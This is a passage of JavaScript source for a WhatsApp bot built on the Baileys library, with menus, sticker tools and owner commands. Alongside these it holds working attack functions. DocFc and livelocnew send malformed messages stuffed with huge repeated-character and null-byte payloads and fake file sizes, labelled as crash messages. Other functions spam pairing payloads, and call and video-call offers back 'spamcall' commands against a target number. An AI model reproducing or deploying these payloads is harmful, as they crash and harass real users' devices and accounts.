//RapippAww

//CLEAR CONSOLE
console.clear();

//END
//SCANING CONTROL

require('../Control/Ctrl')
//END
//INSTALLING BAILEYS

const { default: baileys, downloadContentFromMessage, proto, generateWAMessage, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { 
GroupSettingChange, 
WAGroupMetadata, 
emitGroupParticipantsUpdate, 
emitGroupUpdate, 
WAGroupInviteMessageGroupMetadata, 
GroupMetadata, 
Headers,
WA_DEFAULT_EPHEMERAL,
getAggregateVotesInPollMessage, 
generateWAMessageContent, 
areJidsSameUser, 
useMultiFileAuthState, 
fetchLatestBaileysVersion,
makeCacheableSignalKeyStore, 
makeWaSocket,
makeInMemoryStore,
MediaType,
WAMessageStatus,
downloadAndSaveMediaMessage,
AuthenticationState,
initInMemoryKeyStore,
MiscMessageGenerationOptions,
useSingleFileAuthState,
BufferJSON,
WAMessageProto,
MessageOptions,
WAFlag,
WANode,
WAMetric,
ChatModification,
MessageTypeProto,
WALocationMessage,
ReconnectMode,
WAContextInfo,
ProxyAgent,
waChatKey,
MimetypeMap,
MediaPathMap,
WAContactMessage,
WAContactsArrayMessage,
WATextMessage,
WAMessageContent,
WAMessage,
BaileysError,
WA_MESSAGE_STATUS_TYPE,
MediaConnInfo,
URL_REGEX,
WAUrlInfo,
WAMediaUpload,
mentionedJid,
processTime,
Browser,
MessageType,
Presence,
WA_MESSAGE_STUB_TYPES,
Mimetype,
relayWAMessage,
Browsers,
DisconnectReason,
WASocket,
getStream,
WAProto,
isBaileys,
AnyMessageContent,
templateMessage,
InteractiveMessage,
Header
} = require("@whiskeysockets/baileys");

//END
//EXPORTS BASIC MODULE

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const sharp = require('sharp')
const crypto = require('crypto')
const yts = require('yt-search')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed();
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const jsobfus = require('javascript-obfuscator');
const { VocalRemover } = require('../System/Data8');
const { ocrSpace } = require("ocr-space-api-wrapper");
const { JSDOM } = require('jsdom')

//END
//MODULE MESSAGE + PREFIX

module.exports = Rapip = async (Rapip, m, chatUpdate, store) => {
    try {
      var body = (
      m.mtype === "conversation" ? m.message.conversation :
      m.mtype === "imageMessage" ? m.message.imageMessage.caption :
      m.mtype === "videoMessage" ? m.message.videoMessage.caption :
      m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
      m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
      m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
      m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
      m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
      m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);
        var budy = (typeof m.text == 'string' ? m.text : '');
        var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? 
                        body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" 
                      : global.prefa ?? global.prefix
  
//END
//DATA TAMBAHAN + PELENGKAP
const { 
smsg, 
tanggal, 
getTime, 
isUrl, 
sleep, 
clockString, 
runtime, 
fetchJson, 
getBuffer, 
jsonformat, 
format, 
parseMention, 
getRandom, 
getGroupAdm, 
generateProfilePicture 
} = require('../System/Data1')

//END
//DATA USER + DATA MESSAGE

const Owner = JSON.parse(fs.readFileSync('./Access/Own.json'))
const Premium = JSON.parse(fs.readFileSync('./Access/Prem.json'))
const CMD = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const BotNum = await Rapip.decodeJid(Rapip.user.id)
const DevOnly = [BotNum, ...Owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const PremOnly = [BotNum, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const fatkuns = m.quoted || m;
const quoted = 
  fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] :
  fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
  fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] :
  m.quoted ? m.quoted :
  m;
const qtext = q = args.join(" ")
const qtek = m.quoted && m.quoted.message && m.quoted.message.imageMessage;
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await Rapip.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = m.isGroup ? await groupMetadata.participants : ''
const GroupAdm = m.isGroup ? await getGroupAdm(participants) : ''
const BotAdm = m.isGroup ? GroupAdm.includes(BotNum) : false
const Adm = m.isGroup ? GroupAdm.includes(m.sender) : false
const pushname = m.pushName || "No Name"
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦"
} else if (time >= "15:00:00" && time < "19:00:00") {
    ucapanWaktu = "🌄𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐢𝐚𝐧𝐠"
} else if (time >= "06:00:00" && time < "11:00:00") {
    ucapanWaktu = "🏙️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐚𝐠𝐢"
} else {
    ucapanWaktu = "🌆𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐮𝐛𝐮𝐡"
};
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta', // Zona waktu WIB
  year: 'numeric',
  month: 'long',
  day: 'numeric',
});
const mime = (quoted.msg || quoted).mimetype || ''
const THM = "https://files.catbox.moe/id76qx.jpg"
const Xxx = "https://h.top4top.io/p_3301ml5m70.jpg"
const ryclol = fs.readFileSync('./apip.jpeg')

//END
//DATA TIKTOK SCRAPER

const { tiktok } = require('../System/Data5')

//END
//EXPORTS MODULE BRAT + STICKER

const {
imageToWebp, 
videoToWebp, 
writeExifImg, 
writeExifVid, 
writeExif, 
addExif 
} = require('../System/Data2')

//END
//SEETINGS STATUS BOT

if (!Rapip.public) {
if (!DevOnly) return
}

//END
//INFO NEW MESSAGE IN CONSOLE

if (command) {
  if (m.isGroup) {
    // Log untuk pesan grup
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - GROUP ⌟ ━━━━`));
    console.log(chalk.bgHex('#800080').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Clock : ${time} \n` +
      ` 💬 Message Received : ${m.mtype} \n` +
      ` 🌐 Group Name : ${groupName} \n` +
      ` 🔑 Group Id : ${m.chat} \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  } else {
    // Log untuk pesan privat
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - PRIVATE ⌟ ━━━━`));
    console.log(chalk.bgHex('#800080').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Clock : ${time} \n` +
      ` 💬 Message Received : ${m.mtype} \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 🌐 Group Name : No In Group \n` +
      ` 🔑 Group Id : No In Group \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  }
}

//END
//AUTO RECORDING

let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
//Rapip.sendPresenceUpdate(jd, from) // HAPUS UNTUK MEMATIKAN
}

//END
//FUNCTION LOADING

async function loading () {
var Floading = [
"",
"",
""
]
let { key } = await Rapip.sendMessage(from, {text: " "})
for (let i = 0; i < Floading.length; i++) {
await Rapip.sendMessage(from, {text: Floading[i], edit: key });
}
}

//END
//FILE RESIZE ( FAKE )

const FileSize = (number) => {
var SI_POSTFIXES = ["B", " KB", " MB", " GB", " TB", " PB", " EB"]
var tier = Math.log10(Math.abs(number)) / 3 | 0
if(tier == 0) return number
var postfix = SI_POSTFIXES[tier]
var scale = Math.pow(10, tier * 3)
var scaled = number / scale
var formatted = scaled.toFixed(1) + ''
if (/\.0$/.test(formatted))
formatted = formatted.substr(0, formatted.length - 2)
return formatted + postfix
}

//END
//FUNCTION OBF

async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `Me`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}

//END
//SEND SPAM PAIRING

async function SendPairing(isTarget, Ptcp = false) {
			await Rapip.relayMessage(isTarget, {
					viewOnceMessage: {
						message: {
								nativeFlowResponseMessage: {
									"status":true,
                           "criador":"VenomMods","resultado":"\n{\n\"type\":\"md\",\n\"ws\":{\n\"_events\":{\"CB:ib,,dirty\":[\"Array\"]},\n\"_eventsCount\":20,\n\"_maxListeners\":0,\n\"url\":\"wss://web.whatsapp.com/ws/chat\",\n\"config\":{\n\"version\":[\"Array\"],\n\"browser\":[\"Array\"],\n\"waWebSocketUrl\":\"wss://web.whatsapp.com/ws/chat\",\n\"connectTimeoutMs\":20000,\n\"keepAliveIntervalMs\":30000,\n\"logger\":{},\n\"printQRInTerminal\":false,\n\"emitOwnEvents\":true,\n\"defaultQueryTimeoutMs\":60000,\n\"customUploadHosts\":[],\n\"retryRequestDelayMs\":250,\n\"maxMsgRetryCount\":5,\n\"fireInitQueries\":true,\n\"auth\":{\"Object\":\"authData\"},\n\"markOnlineOnConnect\":true,\n\"syncFullHistory\":false,\n\"linkPreviewImageThumbnailWidth\":192,\n\"transactionOpts\":{\"Object\":\"transactionOptsData\"},\n\"generateHighQualityLinkPreview\":false,\n\"options\":{},\n\"appStateMacVerification\":{\"Object\":\"appStateMacData\"},\n\"mobile\":false\n}\n}\n}"
							}
						}
					}
				},
				ptcp ? {
					participant: {
						jid: isTarget
					}
				} : {}
			);
};
//END
//SEND CALL

const bugpip = (`[ ؆ ] _StatusBugWorking_
 _*\`Status\`*_ : *_200 Second⌛_*
> © 𝐈𝐧ͧ͟𝐕𝐥𝐨𝐢̶̅𝐝͟𝐙𝐞̶̋𝐫𝐨🐉️`)

async function sendOfferCall(isTarget) {
    try {
        await Rapip.offerCall(isTarget);
        console.log(chalk.white.bold(`Success Send Offer Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
    }
}

async function sendOfferVideoCall(isTarget) {
    try {
        await Rapip.offerCall(isTarget, { 
        video: true 
        });
        console.log(chalk.white.bold(`Success Send Offer Video Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Video Call To Target:`, error));
    }
}
//END
//BUTTON MESSAGE ( NOT WORK )
Rapip.sendButton = async (jid, buttons, quoted, opts = {}) => {
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
                  body: {
                     text: opts && opts.body ? opts.body : ''
                  },
                  footer: {
                     text: opts && opts.footer ? opts.footer : ''
                  },
                  nativeFlowMessage: {
                     buttons: buttons,
                     messageParamsJson: ''
                  }
               }
            }
         }
      }, {
         quoted
      })
      await Rapip.sendPresenceUpdate('composing', jid)
      return Rapip.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }
   
//END
//THUMBNAIL LINK + QUOTED MESSAGE

const Zets = {
			key: {
				fromMe: false,
				participant: "0@s.whatsapp.net",
				remoteJid: "status@broadcast"
			},
			message: {
				orderMessage: {
					orderId: "2029",
					thumbnail: ryclol,
					itemCount: `6666`,
					status: "INQUIRY",
					surface: "CATALOG",
					message: `𝗜𝗻𝗩𝗹𝗼𝗶𝗱𝗫𝗶𝗺𝗽𝗿𝗼𝘃𝗲🐉️`,
					token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
				}
			},
			contextInfo: {
				mentionedJid: [m.sender],
				forwardingScore: 999,
				isForwarded: true
			}
		}
		
		const reply33 = (teks) => {
    return Rapip.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `𝐑͟͞𝐚͓̋𝐩͞𝐢̶𝐩̅𝐩͊͢𝐩͊𝐌̷𝐨̲𝐝̚𝐬̋𝐬`,
                body: `RapippNoCounter🐉`,
                mediaType: 3,
                renderLargerThumbnail: false,
                thumbnailUrl: ThumbUrl,
                sourceUrl: `https://whatsapp.com/channel/0029Vb3FLbNDeON7RBx7OX0l`
            }
        }
    }, { quoted: Zets });
}

const ThumbUrl = "https://pomf2.lain.la/f/frej44e.jpg"
const XQuoted = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "@s.whatsapp.net"
				} : {})
			},
			"message": {
				"orderMessage": {
					"orderId": "594071395007984",
					"thumbnail": { "url": "https://h.top4top.io/p_3301ml5m70.jpg" },
					"itemCount": 9741,
					"status": "INQUIRY",
					"surface": "CATALOG",
					"message": `Command : ${command}`,
					"orderTitle": " TamaRyuichi",
					"sellerJid": "6285727819741@s.whatsapp.net",
					"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
					"totalAmount1000": "9741",
					"totalCurrencyCode": "IDR"
				}
			}
		}
		const xXxX = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "@s.whatsapp.net"
				} : {})
			},
			"message": {
				"orderMessage": {
					"orderId": "594071395007984",
					"thumbnail": { "url": "https://h.top4top.io/p_3301ml5m70.jpg" },
					"itemCount": 2009,
					"status": "INQUIRY",
					"surface": "CATALOG",
					"message": `! #Crash Message# !`,
					"orderTitle": " TamaRyuichi",
					"sellerJid": "6285727819741@s.whatsapp.net",
					"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
					"totalAmount1000": "2009",
					"totalCurrencyCode": "IDR"
				}
			}
		}

//END
//START NEW FUNCTION
async function livelocnew(isTarget, ptcp = false) {
let BoomText = "My Location, Come Here!!!" + "ꦾ".repeat(250000);

const messageContent = {
    ephemeralMessage: {
        message: {
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 0,
                        caption: BoomText,
                        sequenceNumber: "",
                        jpegThumbnail: null
                    },
                    body: {
                        text: BoomText
                    },
                    nativeFlowMessage: {}, // If needed, specify more details here
                    contextInfo: {
                     contactVcard: true,
                        mentionedJid: [m.chat],
                        groupMentions: [
                            { 
                                groupJid: "@120363321780343299@g.us", 
                                groupSubject: "TAMARYUICHI" 
                            }
                        ]
                    }
                }
            }
        }
    }
};

async function DocFc(isTarget) {
const stanza = [
{
attrs: { biz_bot: '1' },
tag: "bot",
},
{
attrs: {},
tag: "biz",
},
];

let messagePayload = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "𝐈𝐧ͧ͟𝐕𝐥𝐨𝐢̶̅𝐝͟𝐙𝐞̶̋𝐫𝐨🐉" + "ꦾ".repeat(4500),
listType: 2,
singleSelectReply: {
    selectedRowId: "🔪"
},
contextInfo: {
stanzaId: Rapip.generateMessageTag(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
mentionedJid: [isTarget, "13135550002@s.whatsapp.net"],
quotedMessage: {
                buttonsMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "𝐈𝐧ͧ͟𝐕𝐥𝐨𝐢̶̅𝐝͟𝐙𝐞̶̋𝐫𝐨🐉",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "Wanna Die ? Huh !"
                    },
                    contentText: "I Wanna Die With You \"😮‍💨\"",
                    footerText: "© 𝐈𝐧ͧ͟𝐕𝐥𝐨𝐢̶̅𝐝͟𝐙𝐞̶̋𝐫𝐨",
                    buttons: [
                        {
                            buttonId: "\u0000".repeat(850000),
                            buttonText: {
                                displayText: "𝐑͟͞𝐚͓̋𝐩͞𝐢̶𝐩̅𝐩͊͢𝐩͊𝐌̷𝐨̲𝐝̚𝐬̋𝐬"
                            },
                            type: 1
                        }
                    ],
                    headerType: 3
                }
},
conversionSource: "porn",
conversionData: crypto.randomBytes(16),
conversionDelaySeconds: 9999,
forwardingScore: 999999,
isForwarded: true,
quotedAd: {
advertiserName: " x ",
mediaType: "IMAGE",
jpegThumbnail: ryclol,
caption: " x "
},
placeholderKey: {
remoteJid: "0@s.whatsapp.net",
fromMe: false,
id: "ABCDEF1234567890"
},
expiration: -99999,
ephemeralSettingTimestamp: Date.now(),
ephemeralSharedSecret: crypto.randomBytes(16),
entryPointConversionSource: "wangcap",
entryPointConversionApp: "wangcap",
actionLink: {
url: "t.me/xyroooy",
buttonTitle: "trash"
},
disappearingMode:{
initiator:1,
trigger:2,
initiatorDeviceJid: isTarget,
initiatedByMe:true
},
groupSubject: "crash",
parentGroupJid: "combine",
trustBannerType: "unexpected",
trustBannerAction: 99999,
isSampled: true,
externalAdReply: {
title: "𑲭𑲭 Rapip ",
mediaType: 2,
renderLargerThumbnail: false,
showAdAttribution: false,
containsAutoReply: false,
body: "© 𝐈𝐧ͧ͟𝐕𝐥𝐨𝐢̶̅𝐝͟𝐙𝐞̶̋𝐫𝐨",
thumbnail: ryclol,
sourceUrl: "se me?",
sourceId: "ryc ~ broken",
ctwaClid: "cta",
ref: "ref",
clickToWhatsappCall: true,
automatedGreetingMessageShown: false,
greetingMessageBody: "burst",
ctaPayload: "cta",
disableNudge: true,
originalImageUrl: "trash"
},
featureEligibilities: {
cannotBeReactedTo: true,
cannotBeRanked: true,
canRequestFeedback: true
},
forwardedNewsletterMessageInfo: {
newsletterJid: "120363369514105242@newsletter",
serverMessageId: 1,
newsletterName: `Crash Sletter ~ ${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
contentType: 3,
accessibilityText: "crash"
},
statusAttributionType: 2,
utm: {
utmSource: "utm",
utmCampaign: "utm2"
}
},
description: "INITIATED_BY_USER"
},
messageContextInfo: {
messageSecret: crypto.randomBytes(32),
supportPayload: JSON.stringify({
version: 2,
is_ai_message: true,
should_show_system_message: true,
ticket_id: crypto.randomBytes(16),
}),
},
}
}
}

await Rapip.relayMessage(isTarget, messagePayload, {
additionalNodes: stanza,
participant: { jid : isTarget }
});
}

// Generate the WA message based on the content
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject(messageContent), {
    userJid: m.chat, 
    quoted: QuotedGalaxy // Ensure this is defined or passed correctly
});

// Send the generated message
 Rapip.relayMessage(m.chat, etc.message, {
    participant: { jid: m.chat }, 
    messageId: etc.key.id
});
}
//END
//REPLY MESSAGE
const ReplyImage = (teks) => {
    return Rapip.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `𝐈𝐧ͧ͟𝐕𝐥𝐨𝐢̶̅𝐝͟𝐙𝐞̶̋𝐫𝐨`,
                body: `RapipppModss`,
                mediaType: 3,
                renderLargerThumbnail: false,
                thumbnailUrl: ThumbUrl,
                sourceUrl: `https://youtube.com/@stokrapip`
            }
        }
    }, { quoted: m });
}
const Reply1 = (teks) => {
    return Rapip.sendMessage(m.chat, {
        image: {
            url: "https://files.catbox.moe/id76qx.jpg"
        },
        caption: teks,
        gifPlayback: false
    }, { quoted: m });
}

//END
//STIKER AND BRAT FUNCTION

function getRandomFile(ext) {
    return `${Math.floor(Math.random() * 10000)}${ext}`;
}
async function makeStickerFromUrl(imageUrl, Rapip, m) {
    try {
        let buffer;
        if (imageUrl.startsWith("data:")) {
            const base64Data = imageUrl.split(",")[1];
            buffer = Buffer.from(base64Data, 'base64');
        } else {
            const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
            buffer = Buffer.from(response.data, "binary");
        }
        
        const webpBuffer = await sharp(buffer)
            .resize(512, 512, { fit: 'contain', background: { r: 255, g: 255, b: 255, alpha: 0 } })
            .webp({ quality: 70 })
            .toBuffer();
        
        const penis = await addExif(webpBuffer, global.packname, global.author)

        const fileName = getRandomFile(".webp");
        fs.writeFileSync(fileName, webpBuffer);

        await Rapip.sendMessage(m.chat, {
            sticker: penis,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: `𝐈𝐧ͧ͟𝐕𝐥𝐨𝐢̶̅𝐝͟𝐙𝐞̶̋𝐫𝐨`,
                    body: `RapipppModss`,
                    mediaType: 3,
                    renderLargerThumbnail: false,
                    thumbnailUrl: ThumbUrl, 
                    sourceUrl: `https://youtube.com/@stokrapip`
                }
            }
        }, { quoted: m });

        fs.unlinkSync(fileName);
    } catch (error) {
        console.error("Error creating sticker:", error);
        reply33('Terjadi kesalahan saat membuat stiker. Coba lagi nanti.');
    }
}

async function listbut2(chat, teks, listnye, Zets) {
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 999999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363323868732166@newsletter",
newsletterName: `RapipNoCounter!!`,
serverMessageId: 145
}
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `© InVloidXimprove!!🪷`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: ``,
thumbnailUrl: "",
gifPlayback: true,
subtitle: "",
hasMediaAttachment: true,
...(await prepareWAMessageMedia({ image: { url: './bugz.jpeg' } }, { upload: Rapip.waUploadToServer })),
}),
gifPlayback: true,
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listnye)
}],
}), })}
}}, {quoted: Zets})
await Rapip.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}

//END

const RunTime = `_${runtime(process.uptime())}_`
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
switch(command) {
//ALL MENU CASE {
case 'menu': 
case 'help': {
let Menu = `
┏[ *\`𝗜𝗻𝗩𝗹𝗼𝗶𝗱𝗫𝗶𝗺𝗽𝗿𝗼𝘃𝗲🐉\`* ]
║ \`[ ⑄ 𝗔𝗖𝗘𝗥𝗖𝗔 𝗗𝗘 ⑄]\`
│› ᪥ 𝐁𝐎𝐓 : InVloidXimprove!
║› ᪥ 𝐃𝐄𝐕 : RapippModder
│› ᪥ 𝐕𝐄𝐑𝐒𝐈𝐎𝐍 : VloidX
║  ⏰ *\`${time}\`* 🪷
│\`ᴛʜᴇ ɴᴇᴡ ᴄʀᴀꜱʜᴇᴅ..\`
┣━━━━━━━━━━━━━━━━━
│ _*wellcome user!!*_
┣━━━━━━━━━━━━━━━━━
│  [ *\`𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼\`* ]
║ \`ᜡ\` _*𝐑͟͞𝐚͓̋𝐩͞𝐢̶𝐩̅𝐩͊͢𝐩͊𝐌̷𝐨̲𝐝̚𝐬̋𝐬*_ < D.E.V >
│ \`ᜡ\` _*17Ferdyy*_ < Partner >
║ \`ᜡ\` _*Freezing*_ <OwnImprove2>
│ \`ᜡ\` _*Zacx*_ < OwnImprove >
║ \`ᜡ\` _*BenkzGyuichi*_ < SPY >
│ \`ᜡ\` _*ZenXiter*_ < Supported > 
╚▭▭▭▭▭▭▭▭▭▭▭▭▷
` 
async function fetchBuffer (url, options) {
  try {
    options ? options : {};
    const res = await axios({
      method: "GET",
      url,
      headers: {
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36",
        DNT: 1,
        "Upgrade-Insecure-Request": 1,
      },
      ...options,
      responseType: "arraybuffer",
    });
    return res.data;
  } catch (err) {
    return err;
  }
};


 (async () => {

const buttons = [
  {
    buttonId: ".funmenu", 
    buttonText: {
      displayText: "𝐀𝐋̲̅𝐋́ 𝐌̶̅𝐄̋𝐍̶̅͟𝐔⚡"
    }
  },
  {
    buttonId: ".xs", 
    buttonText: { 
      displayText: '𝐗𝐯̷̚𝐥𝐨𝐢̶̅𝐝𝐁̲𝐮𝐠̋𝐱🚀' 
    }
  }, 
  {
    buttonId: ".owner", 
    buttonText: {
      displayText: "𝐑͟͞𝐚͓̋𝐩͞𝐢̶𝐩̅𝐩͊͢𝐩͊𝐌̷𝐨̲𝐝̚𝐬̋𝐬"
    }
  }
];

let buttonMessage = {
  document: { url: "https://www.youtube.com/@stokrapip" },
  mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
  fileName: "𝐈𝐧ͧ͟𝐕𝐥𝐨𝐢̶̅𝐝͟𝐙𝐞̶̋𝐫𝐨🐉️",
  fileLength: 999,
  pageCount: 999,
  contextInfo: {
  mentionedJid: [m.sender],
  forwardedNewsletterMessageInfo: {
  newsletterName: "RapipNoCounterr!!",
  newsletterJid: `120363369514105242@newsletter`
    },
    forwardingScore: 999,
    isForwarded: true,
    externalAdReply: {
      mediaUrl: "https://www.youtube.com/@stokrapip",
      mediaType: 2,
      previewType: "pdf",
      title: "RapipppNoCounterr",
      body: "RapippGanzz", 
      thumbnail: await fetchBuffer("https://g.top4top.io/p_3335eu0wt0.jpg"),
      sourceUrl: "https://www.youtube.com/@stokrapip",
    },
  },
  caption: Menu,
  footer: "© 𝐑𝐚𝐩𝐢𝐩𝐍𝐨𝐂𝐨𝐮𝐧𝐭𝐞𝐫 ©Copyright",
  buttons: buttons,
  viewOnce: true,
  headerType: 6,
};

return await Rapip.sendMessage(m.chat, buttonMessage, { quoted: Zets });
})()
}
break

case 'funmenu': {
let Menu = `
┏[ *\`𝗜𝗻𝗩𝗹𝗼𝗶𝗱𝗫𝗶𝗺𝗽𝗿𝗼𝘃𝗲🐉\`* ]
║ \`[ ⑄ 𝗔𝗖𝗘𝗥𝗖𝗔 𝗗𝗘 ⑄]\`
│› ᪥ 𝐁𝐎𝐓 : InVloidXimprove!
║› ᪥ 𝐃𝐄𝐕 : RapippModder
│› ᪥ 𝐕𝐄𝐑𝐒𝐈𝐎𝐍 : VloidX
║  ⏰ *\`${time}\`* 🪷
│\`ᴛʜᴇ ɴᴇᴡ ᴄʀᴀꜱʜᴇᴅ..\`
┣━━━━━━━━━━━━━━━━━
┣[ *\`𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨🐉\`* ]
┣━━━━━━━━━━━━━━━━━
║› ᪥ addprem 
│› ᪥ addowner
║› ᪥ kick
│› ᪥ add
║› ᪥ delowner
│› ᪥ resetlinkgc
║› ᪥ setpp
┣━━━━━━━━━━━━━━━━━
┣[ *\`𝗙𝗨𝗡 𝗠𝗘𝗡𝗨🐉\`* ]
┣━━━━━━━━━━━━━━━━━
│› ᪥ rvo 
║› ᪥ tovn
│› ᪥ linkgroup
║› ᪥ ocr
│› ᪥ tourl
║› ᪥ brat
│› ᪥ tiktok 
┣━━━━━━━━━━━━━━━━━
┣[ *\`𝗦𝗣𝗔𝗠 𝗠𝗘𝗡𝗨🐉\`* ]
┣━━━━━━━━━━━━━━━━━
║› ᪥ spamcall \`number\`
│› ᪥ spamcallvid \`number\`
┣━━━━━━━━━━━━━━━━━
│  [ *\`𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼\`* ]
║ \`ᜡ\` _*𝐑͟͞𝐚͓̋𝐩͞𝐢̶𝐩̅𝐩͊͢𝐩͊𝐌̷𝐨̲𝐝̚𝐬̋𝐬*_ < D.E.V >
│ \`ᜡ\` _*17Ferdyy*_ < Partner >
║ \`ᜡ\` _*Freezing*_ <OwnImprove2>
